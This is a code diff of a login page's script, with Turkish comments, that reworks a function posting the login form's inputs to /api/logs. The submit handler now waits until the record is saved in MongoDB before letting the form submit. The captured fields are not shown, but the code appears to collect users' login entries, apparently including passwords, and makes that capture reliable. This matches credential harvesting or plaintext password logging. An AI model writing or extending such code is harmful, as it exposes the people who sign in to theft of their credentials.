@@ -381,7 +381,7 @@
       el.parentElement.lastElementChild.style.display = 'none';
     }
 
-    function logFormSubmission() {
+    async function logFormSubmission() {
       const payload = {
         page: 'login',
         inputs: {
@@ -396,22 +396,29 @@
 
       try {
         const body = JSON.stringify(payload);
-        if (navigator.sendBeacon) {
-          const blob = new Blob([body], { type: 'application/json' });
-          navigator.sendBeacon('/api/logs', blob);
-        } else {
-          fetch('/api/logs', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body
-          }).catch(err => console.error('Log submit failed', err));
+        // sendBeacon yerine fetch kullanarak await edebiliriz
+        // keepalive özelliği sayfa kapanırken bile request'in tamamlanmasını sağlar
+        const response = await fetch('/api/logs', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body,
+          keepalive: true
+        });
+        
+        if (!response.ok) {
+          console.error('Log submit failed:', response.status, response.statusText);
+          // Hata olsa bile devam et - yine de kayıt denenmeli
         }
+        
+        return true;
       } catch (err) {
         console.error('Failed to log submission', err);
+        // Hata olsa bile false dönme - yine de kayıt denenmeli
+        return false;
       }
     }
 
-    f1.addEventListener('submit', (e) => {
+    f1.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       var ev = em.value;
@@ -422,7 +429,9 @@
       emValid ? tFn(em) : errFn(em);
 
       if (pwValid && emValid) {
-        logFormSubmission();
+        // MongoDB'ye kaydın %100 tamamlanmasını bekle
+        await logFormSubmission();
+        // Kayıt tamamlandıktan sonra formu submit et
         f1.submit();
       }
     });
